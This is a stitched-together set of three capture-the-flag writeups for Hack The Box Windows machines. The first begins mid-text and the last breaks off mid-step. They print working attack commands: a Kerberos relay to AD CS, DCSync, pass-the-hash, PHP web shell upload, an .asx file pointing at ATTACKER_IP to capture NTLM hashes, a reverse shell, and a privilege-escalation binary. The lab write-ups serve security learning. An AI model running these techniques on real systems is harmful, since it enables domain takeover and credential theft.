└─$ showmount -e 10.129.234.48 Export list for 10.129.234.48: /profiles (everyone) There is a profiles directory available through the share. To access it, we need to mount it locally first:
└─$ sudo mkdir mnt └─$ sudo mount -t nfs 10.129.234.48:/profiles mnt/ To get an overview of the structure of the share directory:
└─$ tree ./mnt ./mnt ├── Administrator │ ├── Documents [error opening dir] │ └── vacation.png ├── Daniel.Marshall ├── Debra.Wright ├── Jane.Carter ├── Jordan.Francis ├── Joyce.Andrews ├── Katie.Ward ├── Megan.Simpson ├── Richard.Gibbons ├── Rosie.Powell │ ├── Documents [error opening dir] │ └── marketing.png └── Shirley.West From the above output, it can be seen that only Administrator and Rosie.Powell folders contain a subdirectory with a png file. Viewing the vacation.png shows a picture of a para glider using laptop:
When we tried to view the marketing.png, we get access denied error:
└─$ file mnt/Rosie.Powell/marketing.png marketing.png: regular file, no read permission We can switch to root with sudo su and then access the png which allows us to view the image now:
A sticky note on the desk contains the text “Cicada123”, which appears to be a password. Since the image belongs to Rosie.Powell, we can test this value as her password:
└─$ nxc smb 10.129.234.48 -u 'Rosie.Powell' -p 'Cicada123' SMB 10.129.234.48 445 DC-JPQ225 [*] x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False) SMB 10.129.234.48 445 DC-JPQ225 [-] cicada.vl\Rosie.Powell:Cicada123 STATUS_NOT_SUPPORTED The STATUS_NOT_SUPPORTED and NTLM:False output shows that NTLM authentication is disabled in the domain.
Kerberos Authentication # As Netexec defaults to using NTLM authentication, we get the denied error. We can use Kerberos authentication by appending a -k flag to our command as:
└─$ nxc smb 10.129.234.48 -u 'Rosie.Powell' -p 'Cicada123' -k SMB 10.129.234.48 445 DC-JPQ225 [*] x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False) SMB 10.129.234.48 445 DC-JPQ225 [+] cicada.vl\Rosie.Powell:Cicada123 Now we successfully authenticated and confirmed that the credentials work for the username Rosie.Powell. To enumerate the SMB shares accessible to us:
└─$ nxc smb 10.129.234.48 -u 'Rosie.Powell' -p 'Cicada123' -k --shares SMB 10.129.234.48 445 DC-JPQ225 [*] x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False) SMB 10.129.234.48 445 DC-JPQ225 [+] cicada.vl\Rosie.Powell:Cicada123 SMB 10.129.234.48 445 DC-JPQ225 [*] Enumerated shares SMB 10.129.234.48 445 DC-JPQ225 Share Permissions Remark SMB 10.129.234.48 445 DC-JPQ225 ----- ----------- ------ SMB 10.129.234.48 445 DC-JPQ225 ADMIN$ Remote Admin SMB 10.129.234.48 445 DC-JPQ225 C$ Default share SMB 10.129.234.48 445 DC-JPQ225 CertEnroll READ Active Directory Certificate Services share SMB 10.129.234.48 445 DC-JPQ225 IPC$ READ Remote IPC SMB 10.129.234.48 445 DC-JPQ225 NETLOGON READ Logon server share SMB 10.129.234.48 445 DC-JPQ225 profiles$ READ,WRITE SMB 10.129.234.48 445 DC-JPQ225 SYSVOL READ Logon server share We only have one non-default share profile$. To spider all the accessible shares, we can use spider_plus module of Netexec:
└─$ nxc smb 10.129.234.48 -u 'Rosie.Powell' -p 'Cicada123' -k -M spider_plus The output results from the shares enumeration doesn’t contain anything useful.
Port 80 shows the usual IIS server landing page
To find if there are any hidden directories we can perform fuzzing with Ffuf:
└─$ ffuf -u 'http://cicada.vl/FUZZ' -ic -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -fc 404 The output revealed nothing.
AD CS Enumeration # As from the SMB shares, we can see there is a share for CertEnroll which is used by Active Directory Certificate Services. To find if the ADCS is vulnerable or misconfigured:
└─$ certipy find -u Rosie.Powell@cicada.vl -p 'Cicada123' -target DC-JPQ225.cicada.vl -vulnerable -stdout -k -no-pass Certipy v5.0.3 - by Oliver Lyak (ly4k) [!] DNS resolution failed: The DNS query name does not exist: DC-JPQ225.cicada.vl. [!] Use -debug to print a stacktrace [*] Finding certificate templates [*] Found 33 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 11 enabled certificate templates [*] Finding issuance policies [*] Found 13 issuance policies [*] Found 0 OIDs linked to templates [*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP [*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA' [*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl' [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [*] Enumeration output: Certificate Authorities 0 CA Name : cicada-DC-JPQ225-CA DNS Name : DC-JPQ225.cicada.vl Certificate Subject : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl Certificate Serial Number : 614780C211D587984F8CB6E4663049AD Certificate Validity Start : 2026-07-11 03:57:06+00:00 Certificate Validity End : 2526-07-11 04:07:06+00:00 Web Enrollment HTTP Enabled : True HTTPS Enabled : False User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Active Policy : CertificateAuthority_MicrosoftDefault.Policy Permissions Owner : CICADA.VL\Administrators Access Rights ManageCa : CICADA.VL\Administrators CICADA.VL\Domain Admins CICADA.VL\Enterprise Admins ManageCertificates : CICADA.VL\Administrators CICADA.VL\Domain Admins CICADA.VL\Enterprise Admins Enroll : CICADA.VL\Authenticated Users [!] Vulnerabilities ESC8 : Web Enrollment is enabled over HTTP. Certificate Templates : [!] Could not find any certificate templates The output shows that there is no vulnerable template but the ADCS Server is itself vulnerable to ESC8. SpecterOPS define ESC8 as:
ESC8 is a misconfiguration in Active Directory Certificate Services (AD CS), which stems from insufficiently protected web enrollment services. Specifically, if a web enrollment service is not hosted over HTTPS with Channel Binding enforced, NTLM authentication attempts in the domain network can be relayed to the web enrollment service to request certificates for other domain principals.
We can’t relay NTLM authentication to the HTTP enrollment endpoint as NTLM is disabled in the domain. Researching for Kerberos authentication relay to ADCS HTTP revealed the article from Synacktiv.
The article describes a technique that abuses the way Windows marshals and unmarshals SPN (Service Principal Name) information during SMB authentication. Normally, when a client authenticates to a service using Kerberos, the ticket is issued for the exact SPN requested by the client. Since the ticket is cryptographically tied to that SPN, relaying it to another service is normally impossible because the target service cannot decrypt a ticket intended for a different SPN.
During SMB authentication, however, Windows uses the CredMarshalTargetInfo API to append a serialized (marshaled) representation of the target information to the hostname. The resulting hostname appears unusual, for example:
DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA Although this looks like a completely different hostname, Windows recognizes the appended blob as marshaled data. Before requesting the Kerberos ticket, it automatically unmarshals the value using the corresponding CredUnmarshalTargetInfo API, recovering the original hostname DC-JPQ225. Consequently, the KDC issues a Kerberos ticket for the legitimate SPN:
cifs/DC-JPQ225.cicada.vl DNS resolution, however, occurs before the unmarshaling step. Therefore, if an attacker creates a DNS record with the marshaled hostname pointing to their own machine, the coerced authentication is sent to the attacker’s server while still carrying a valid Kerberos ticket for the original domain controller. Since the ticket remains valid for the intended SPN, tools such as krbrelayx can relay it to another service running under the same machine account, such as the AD CS HTTP enrollment endpoint vulnerable to ESC8.
To exploit this behavior, we create a DNS record whose hostname consists of the original hostname followed by the marshaled target information. The record points to our attacking machine instead of the domain controller. When the DC later connects to this hostname, DNS directs the connection to us, while Windows internally unmarshals the hostname back to DC-JPQ225, causing the Kerberos ticket to be generated for the legitimate SPN.
Kerberos Relay to AD CS # To add the new DNS entry, we can use dnstool and point the A records of the entry to our attacking machine IP:
└─$ dnstool -u "cicada.vl\\Rosie.Powell" -p "Cicada123" -k -r "DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "10.10.14.66" -dc-ip 10.129.234.48 -dns-ip 10.129.234.48 --action add 'DC-JPQ225.cicada.vl' --tcp [-] Connecting to host... [-] Binding to host [+] Bind OK [-] Adding new record [+] LDAP operation completed successfully We can confirm if the entry is added successfully or not using dig tool:
└─$ dig @10.129.234.48 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl' A ; <<>> DiG 9.20.20-1-Debian <<>> @10.129.234.48 DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl A ; (1 server found) ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 26742 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl. IN A ;; ANSWER SECTION: DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl. 180 IN A 10.10.14.66 ;; Query time: 240 msec ;; SERVER: 10.129.234.48#53(10.129.234.48) (UDP) ;; WHEN: Sat Jul 11 12:52:22 PKT 2026 ;; MSG SIZE rcvd: 108 As the entry is added now and points to our IP, we can start the coercion so that the DC will send the Kerberos authentication to us which we can relay to the HTTP endpoint. First we can check what coercion methods we can use for the target using coerce_plus module of Netexec:
└─$ netexec smb 10.129.234.48 -u 'Rosie.Powell' -p 'Cicada123' -k -M coerce_plus SMB 10.129.234.48 445 DC-JPQ225 [*] x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False) SMB 10.129.234.48 445 DC-JPQ225 [+] cicada.vl\Rosie.Powell:Cicada123 COERCE_PLUS 10.129.234.48 445 DC-JPQ225 VULNERABLE, DFSCoerce COERCE_PLUS 10.129.234.48 445 DC-JPQ225 VULNERABLE, PetitPotam COERCE_PLUS 10.129.234.48 445 DC-JPQ225 VULNERABLE, PrinterBug COERCE_PLUS 10.129.234.48 445 DC-JPQ225 VULNERABLE, PrinterBug COERCE_PLUS 10.129.234.48 445 DC-JPQ225 VULNERABLE, MSEven We can use 4 different methods as the DC can be coerced through them. First we need to start the relay server using Krbrelayx:
└─$ krbrelayx -t 'http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC-JPQ225$' [*] Protocol Client LDAPS loaded.. [*] Protocol Client LDAP loaded.. [*] Protocol Client HTTPS loaded.. [*] Protocol Client HTTP loaded.. [*] Protocol Client SMB loaded.. [*] Running in attack mode to single host [*] Running in kerberos relay mode because no credentials were specified. [*] Setting up SMB Server [*] Setting up HTTP Server on port 80 [*] Setting up DNS Server [*] Servers started, waiting for connections Now to coerce the target:
└─$ netexec smb 10.129.234.48 -u 'Rosie.Powell' -p 'Cicada123' -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=Petitpotam SMB 10.129.234.48 445 DC-JPQ225 [*] x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False) SMB 10.129.234.48 445 DC-JPQ225 [+] cicada.vl\Rosie.Powell:Cicada123 COERCE_PLUS 10.129.234.48 445 DC-JPQ225 VULNERABLE, PetitPotam COERCE_PLUS 10.129.234.48 445 DC-JPQ225 Exploit Success, efsrpc\EfsRpcAddUsersToFile Obtaining the Domain Controller Certificate # Looking back in the krbrelayx terminal shows that the connection received successfully and after retrieving the TGS from the request, it gets the certificate and write it to the DC-JPQ225.pfx file
Notice that the relay target is the legitimate AD CS Web Enrollment endpoint (http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp). Although the incoming Kerberos authentication reaches our attacker-controlled server because of the malicious DNS record, krbrelayx extracts the Kerberos ticket and immediately relays it to the genuine HTTP service running on the domain controller. Since both the SMB service and the AD CS Web Enrollment service run under the same machine account, the service can successfully decrypt and accept the relayed Kerberos ticket.
Domain Compromise # Authenticating as the Domain Controller # Using the certificate, we can get the TGT for the DC machine using certipy. Possessing a certificate for the Domain Controller allows us to authenticate as the machine account using PKINIT. We can therefore request a TGT for DC-JPQ225$ without knowing its password.:
└─$ certipy auth -pfx DC-JPQ225.pfx -dc-ip 10.129.234.48 Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN DNS Host Name: 'DC-JPQ225.cicada.vl' [*] Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000' [*] Using principal: 'dc-jpq225$@cicada.vl' [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to 'dc-jpq225.ccache' [*] Wrote credential cache to 'dc-jpq225.ccache' [*] Trying to retrieve NT hash for 'dc-jpq225$' [*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3 Performing DCSync # As a Domain Controller machine account inherently possesses the privileges required to replicate Active Directory, we can perform a DCSync attack to retrieve password hashes directly from the domain database.
└─$ impacket-secretsdump cicada.vl/'dc-jpq225$'@DC-JPQ225.cicada.vl -k -no-pass -just-dc-user Administrator Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4 Administrator:des-cbc-md5:fd2a29621f3e7604 [*] Cleaning up... Using the recovered NT hash, we can perform a Pass-the-Hash style Kerberos authentication to obtain a TGT for the Administrator account.
└─$ impacket-getTGT cicada.vl/Administrator -hashes ':85a0da53871a9d56b6cd05deda3a5e87' -dc-ip 10.129.234.48 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in Administrator.ccache Authenticating as Administrator # With the ticket, we can use impacket-psexec to log in to the host:
└─$ KRB5CCNAME=Administrator.ccache impacket-psexec cicada.vl/Administrator@DC-JPQ225.cicada.vl -k -no-pass The user.txt and root.txt both are present in the Administrator’s desktop
summary: Abuse Kerberos relay with marshal/unmarshal SPN to exploit AD CS ESC8, obtain a Domain Controller certificate, perform DCSync, and compromise Active Directory.
title: Vulncicada Machine Writeup | HTB

content:
Reconnaissance # Rustscan # We start with Rustscan to quickly identify all the open ports from the total 65535 possible ports
└─$ rustscan -a <TARGET_IP> -r 0-65535 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 127 80/tcp open http syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap <TARGET_IP> -T4 -sC -sV -Pn -p 22,80,3389 Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-25 20:58 +0500 Nmap scan report for <TARGET_IP> Host is up (0.091s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_9.5 (protocol 2.0) 80/tcp open http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17) |_http-title: ProMotion Studio |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2026-06-25T15:58:15+00:00; -3s from scanner time. | ssl-cert: Subject: commonName=MEDIA | Not valid before: 2026-06-24T15:38:39 |_Not valid after: 2026-12-24T15:38:39 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -3s Initial Access # Port 80 Enumeration # While reviewing the web application on port 80, we observed that this web page only has one functionality which allows users to upload Windows Media Player-compatible video files.
Since the application was running PHP as confirmed by the Nmap scan, I attempted to upload a simple PHP web shell. I tried injecting the usual one liner web shell in place of the media file and it successfully uploaded. However, the upload location of the web shell was still unknown. After checking the front-end source code, we found that the images are being loaded from an assets directory at http://<TARGET_IP>/assets
After visiting it, we found that it has directory listing enabled but there are no useful files. Only image files that are already shown on the website page.
NTLM Hash Capture # The website expects us to upload media files so I searched for vulnerabilities regarding uploading of Windows Media Player files. Searching for Windows Media Player upload abuse led to an article on NTLM Privilege Escalation which in one section involved the use of Windows Media Player files. The article described how Windows Media Player playlist formats such as .asx, .wax, .wvx, and .wmx could reference remote resources and trigger NTLM authentication. All we need to do is to make a user open these files. As from the upload message we saw that
So there is a good chance someone may click and open our files and we will capture the NTLMv2 challenge-response hash. The article also provided the contents of an .asx file. We only needed to replace the attacker IP address.
<asx version="3.0"> <title>Leak</title> <entry> <title></title> <ref href="file://ATTACKER_IP\\share\\track.mp3" /> </entry> </asx> Run the responder tool to capture the hashes:
└─$ sudo responder -I tun0 Upload the file through the upload form and wait for a few moment. After a while we received the NTLMv2 challenge-response hash of the enox user
We can crack the hash by saving it in a file and running Hashcat on it with mode 5600:
└─$ hashcat -m 5600 enox-NTLMv2.txt /usr/share/wordlists/rockyou.txt SSH Access # The password was successfully cracked and we can verify whether the credentials are valid for SSH or WinRM with netexec:
└─$ sudo nxc ssh <TARGET_IP> -u 'enox' -p '<Enox-Password>' └─$ sudo nxc rdp <TARGET_IP> -u 'enox' -p '<Enox-Password>' The credentials were valid for both services, but when we tried to login via RDP, it didn’t allow us to log in as along with having valid credentials, our controlled user should also be in the “Remote Desktop Users” group of the target system. But we can use SSH to login as it works:
└─$ ssh enox@<TARGET_IP> We can find the user.txt in the Desktop of enox user
Escalating Privileges # In the Documents folder, a PowerShell script review.ps1 is present which is handling the execution of uploaded files by using Windows Media Player. Looking at the website’s index.php code in “C:\xampp\htdocs”, we can see how the uploaded files are being handled by the web application. The PHP code is present at the top of the index.php file.
The PHP script handles file uploads for a job application form. It sanitizes the user-provided details, generates an MD5 hash of the applicant’s first name, last name, and email, and uses the hash as a unique upload directory under “C:\Windows\Tasks\Uploads".
The uploaded filename is sanitized to allow only alphanumeric characters, periods, and underscores before being saved. Upon a successful upload, the script logs the original filename and the corresponding MD5 directory name to “todo.txt”, which can be used to associate uploaded files with applicants.
Abusing Junctions for Code Execution # To get access to the shell.php we uploaded to the web, we need to link it to the root of the htdocs where other files we accessed before are present. Similar to symbolic links (symlinks) on Linux, we can create Junctions in Windows which creates a link between folders. Then we can access the linked folder from the linking folder. To make it work, we need to first get the name of directory that will be created when we upload a file. As the folder name is dependent on the MD5 hash generated by the combination of first name, last name and email we provide in the web upload form, we can simply upload a new file and check which directory is created.
After uploading a file with the above mentioned user details, a folder named “d5cfa30195eeb4b848b7a5d63d09d336” is created and the shell.php file we provided in the upload form is present in the folder. Now we can delete the folder and create a junction from this folder to C:\xampp\htdocs. To delete the folder, we need to make it empty first as:
enox@MEDIA C:\Windows\Tasks\Uploads> del d5cfa30195eeb4b848b7a5d63d09d336\shell.php enox@MEDIA C:\Windows\Tasks\Uploads> rmdir d5cfa30195eeb4b848b7a5d63d09d336 Then create the Junction with:
enox@MEDIA C:\Windows\Tasks\Uploads> mklink /J "C:\Windows\Tasks\Uploads\d5cfa30195eeb4b848b7a5d63d09d336" "C:\xampp\htdocs" Now if we list the content of d5cfa30195eeb4b848b7a5d63d09d336 folder, we will see the files present in htdocs so this means we have successfully linked the two folders.
enox@MEDIA C:\Windows\Tasks\Uploads>dir d5cfa30195eeb4b848b7a5d63d09d336 Volume in drive C has no label. Volume Serial Number is EAD8-5D48 Directory of C:\Windows\Tasks\Uploads\d5cfa30195eeb4b848b7a5d63d09d336 06/26/2026 03:05 AM <DIR> . 10/02/2023 11:03 AM <DIR> .. 10/02/2023 10:27 AM <DIR> assets 10/02/2023 10:27 AM <DIR> css 10/10/2023 05:00 AM 20,563 index.php 10/02/2023 10:27 AM <DIR> js 0 File(s) 0 bytes 5 Dir(s) 9,944,481,792 bytes free Go back to the video upload form on web and upload a new shell.php. After upload, we can list the folder content again and see that shell.php was written in the web root instead of the Uploads directory:
enox@MEDIA C:\Windows\Tasks\Uploads>dir d5cfa30195eeb4b848b7a5d63d09d336 Volume in drive C has no label. Volume Serial Number is EAD8-5D48 Directory of C:\Windows\Tasks\Uploads\d5cfa30195eeb4b848b7a5d63d09d336 06/26/2026 03:05 AM <DIR> . 10/02/2023 11:03 AM <DIR> .. 10/02/2023 10:27 AM <DIR> assets 10/02/2023 10:27 AM <DIR> css 10/10/2023 05:00 AM 20,563 index.php 10/02/2023 10:27 AM <DIR> js 06/25/2026 02:35 PM 32 shell.php 0 File(s) 0 bytes 5 Dir(s) 9,944,481,792 bytes free To verify code execution, use curl:
└─$ curl 'http://<TARGET_IP>/shell.php?cmd=whoami' nt authority\local service To get a reverse shell as the “local service”, we can generate a PowerShell reverse shell from Revshells. Pass the PowerShell #3 (Base64) payload in the curl command:
└─$ curl 'http://<TARGET_IP>/shell.php?cmd=<PowerShell-Payload>' Before sending the request, open a netcat listener on the port specified in the payload:
└─$ rlwrap nc -lvnp <PORT> After gaining the shell, we can check the privileges of the local service:
PS C:\temp> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= =================================== ======== SeTcbPrivilege Act as part of the operating system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled The one that looks interesting is the “SeTcbPrivilege”.
Exploiting SeTcbPrivilege # Looking for exploitation techniques we found a method at ADMinions. The C++ code for the executable is given at GitHub. We can compile the binary ourselves using mingw:
└─$ x86_64-w64-mingw32-g++ TcbElevation.cpp -o TcbElevation.exe -lsecur32 -municode Transfer the binary using curl and we can execute it with the command of adding our user “enox” to the Administrators group:
PS C:\temp> .\customTCB.exe helo 'net localgroup Administrators enox /add' Verify that the privilege escalation succeeded by checking the local Administrators group.
PS C:\temp> net localgroup Administrators Alias name Administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator enox The command completed successfully. So now we can SSH again into the system from a new terminal and get the root.txt in the Administrator’s Desktop.
summary: Explore a Windows machine featuring NTLM hash capture, junction point abuse, and SeTcbPrivilege exploitation to obtain full system compromise.
title: Media Machine Writeup | HTB

content:
Summary # TombWatcher is a medium-difficulty Active Directory machine that focuses heavily on privilege escalation through delegated permissions and object control abuse. Starting from a low-privileged domain user, the attack chain leverages WriteSPN permissions to perform targeted Kerberoasting and recover additional credentials. Subsequent access to privileged groups enables the extraction of a gMSA password, which is used to compromise multiple domain accounts through ACL abuse. After obtaining interactive access via WinRM, further enumeration reveals control over an organizational unit and the ability to restore deleted Active Directory objects. The machine concludes with the exploitation of a vulnerable AD CS certificate template through ESC15, allowing the issuance of a certificate for the Administrator account and resulting in full domain compromise.
Reconnaissance # Rustscan # We start with rustscan to quickly identify all the open ports from the total 65535 possible ports
└─$ rustscan -a <TARGET_IP> -r 0-65535 PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49693/tcp open unknown syn-ack ttl 127 49694/tcp open unknown syn-ack ttl 127 49696/tcp open unknown syn-ack ttl 127 49716/tcp open unknown syn-ack ttl 127 51436/tcp open unknown syn-ack ttl 127 51453/tcp open unknown syn-ack ttl 127 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap <TARGET_IP> -T4 -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49693,49694,49696,49716,51436,51453 Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-24 23:41 +0500 Nmap scan report for <TARGET_IP> Host is up (0.41s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-06-24 18:41:29Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name) |_ssl-date: 2026-06-24T18:43:05+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=DC01.tombwatcher.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb | Not valid before: 2026-06-24T11:54:55 |_Not valid after: 2027-06-24T11:54:55 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name) |_ssl-date: 2026-06-24T18:43:04+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=DC01.tombwatcher.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb | Not valid before: 2026-06-24T11:54:55 |_Not valid after: 2027-06-24T11:54:55 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.tombwatcher.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb | Not valid before: 2026-06-24T11:54:55 |_Not valid after: 2027-06-24T11:54:55 |_ssl-date: 2026-06-24T18:43:05+00:00; 0s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name) |_ssl-date: 2026-06-24T18:43:04+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=DC01.tombwatcher.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb | Not valid before: 2026-06-24T11:54:55 |_Not valid after: 2027-06-24T11:54:55 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49693/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49694/tcp open msrpc Microsoft Windows RPC 49696/tcp open msrpc Microsoft Windows RPC 49716/tcp open msrpc Microsoft Windows RPC 51436/tcp open msrpc Microsoft Windows RPC 51453/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required | smb2-time: | date: 2026-06-24T18:42:25 |_ start_date: N/A From the output, we identified that the DNS name of the machine is “DC01.tombwatcher.htb” and the Active Directory Domain is “tombwatcher.htb”. We can write the following DNS entry in our /etc/hosts file:
<TARGET_IP> DC01.tombwatcher.htb DC01 tombwatcher.htb To sync the system time with that of the DC, use ntpdate:
└─$ sudo ntpdate <TARGET_IP> Initial Access # Active Directory Enumeration # We will start with enumerating the SMB shares accessible to us using the netexec tool:
└─$ sudo nxc smb <TARGET_IP> -u henry -p 'H3nry_987TGV!' --shares Share Permissions Remark ----- ----------- ------ ADMIN$ Remote Admin C$ Default share IPC$ READ Remote IPC NETLOGON READ Logon server share SYSVOL READ Logon server share These are standard Domain Controller SMB shares and there are no custom share available. We can spider the shares automatically and see if we have any interesting files hidden:
└─$ sudo nxc smb <TARGET_IP> -u henry -p 'H3nry_987TGV!' -M spider_plus Reviewing the output did not reveal anything useful. Therefore, we will use the BloodHound Python collector to gather Active Directory data and identify potential attack paths:
└─$ bloodhound-ce-python -c all -u 'henry' -p 'H3nry_987TGV!' -d 'tombwatcher.htb' -ns <TARGET_IP> --dns-tcp --zip --dns-timeout 90 Open the Bloodhound GUI with:
└─$ bloodhound-start Starting from the Henry user node, since we have valid credentials for this account. We analyzed that it has WriteSPN property over the user Alfred
As Kerberoasting attacks target Service Accounts set with ServicePrincipalNames to find their clear-text password by cracking the acquired TGS tickets, we can use this property to write or remove SPNs from the target user. Since this user currently has no SPNs configured, we can add one ourselves. We can use the suggested methods provided by bloodhound by clicking WriteSPN > Linux Abuse
The tool says that to perform the kerberoasting attack, we can use the python script targetedKerberoast.py as:
└─$ python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --dc-ip <TARGET_IP> --request-user alfred Save the hash in a file and crack with hashcat mode 13100:
└─$ hashcat -m 13100 Alfred-TGS.hash /usr/share/wordlists/rockyou.txt The password for the Alfred account is successfully recovered.
Looking at the outbound object control privileges of Alfred we see that it can add itself to the AD group Infrastructure
Looking at the outbound object control of the group shows it can read the gMSA (Group Managed Service Account) password for the computer account Ansible_Dev$
Then looking at the privileges of the computer account revealed that it can change the account password for user Sam
Looking at Sam’s priviliges we can write the owner attribute of the user John
Then John has GenericAll over the Organizational Unit (OU) ADCS
The attack path can be summarized as:
Henry → Alfred → Infrastructure → Ansible_Dev$ → Sam → John → ADCS OU Exploiting the BloodHound Attack Path # We can start with adding Alfred to the Infrastructure group with bloodyad:
